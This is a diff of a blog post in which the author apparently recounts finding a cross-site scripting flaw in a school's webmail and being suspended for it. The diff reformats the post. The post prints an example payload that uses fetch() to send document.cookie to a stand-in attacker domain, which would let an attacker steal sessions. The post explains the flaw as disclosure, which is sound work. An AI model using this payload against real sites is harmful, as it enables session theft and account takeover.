@@ -1,5 +1,5 @@
 ---
-title: "I got suspended for doing the right thing."
+title: "I got suspended for doing the right thing"
 publishedAt: 1656992369870
 description: "And why no good deed goes unpunished."
 tags: ["coding", "cybersecurity", "hacking"]
@@ -23,14 +23,16 @@ Why? Because of something called a [Cross Site Scripting Attack (XSS)](https://o
 In this situation, it means an attacker can send someone a link to XMail with a specially crafted payload encoded, and when the user clicks the link they'll be directed to XMail, but without knowing it, malicious code is running on their browser. This is especially dangerous because of the way the school website worked, where _session IDs were not stored in an [HttpOnly cookie](https://owasp.org/www-community/HttpOnly)_, allowing an attacker access to a user's cookies using `document.cookie`.
 The attacker can then make a HTTP request to a remote server and send that cookie over, using an example payload encoded into the URL like this:
 
-<CodeBlock code={`fetch("http://someotherdomainIown.com/receive-cookies", {
+```javascript
+fetch("http://someotherdomainIown.com/receive-cookies", {
   method: "POST",
   mode: "no-cors",
   body: document.cookie,
   headers: {
     "Content-Type": "application/x-www-form-urlencoded "
   }
-});`} />
+});
+```
 
 With this session ID in hand, the attacker can then authenticate themselves as the user without them knowing. To them, they just clicked on a link that took them to their email, but to an attacker, they now have full access to their account. This meant someone could target a student, a teacher, or even a principal. Everyone was at risk.
 This had the potential of costing the school district tens of thousands of dollars.
